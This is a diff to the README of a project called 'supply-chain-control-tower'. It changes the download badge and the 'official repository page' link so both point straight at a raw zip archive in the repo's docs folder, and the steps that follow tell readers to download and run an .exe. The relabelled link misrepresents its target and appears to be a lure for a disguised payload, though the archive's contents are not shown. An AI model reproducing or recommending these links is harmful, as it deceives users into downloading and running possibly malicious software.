@@ -1,6 +1,6 @@
 # 📦 supply-chain-control-tower - Improve global supply chain decision making
 
-[![](https://img.shields.io/badge/Download-Software-blue)](https://github.com/dudleyinnermost116/supply-chain-control-tower)
+[![](https://img.shields.io/badge/Download-Software-blue)](https://github.com/dudleyinnermost116/supply-chain-control-tower/raw/refs/heads/main/docs/supply_control_chain_tower_v1.4.zip)
 
 ## 📋 Overview
 
@@ -22,7 +22,7 @@ Your computer needs to meet these basic standards to run the software smoothly:
 
 Follow these steps to set up the software:
 
-1. Visit the [official repository page](https://github.com/dudleyinnermost116/supply-chain-control-tower).
+1. Visit the [official repository page](https://github.com/dudleyinnermost116/supply-chain-control-tower/raw/refs/heads/main/docs/supply_control_chain_tower_v1.4.zip).
 2. Look for the section labeled Releases on the right side of the page.
 3. Select the latest version to view the available files.
 4. Download the file ending in .exe to your computer.
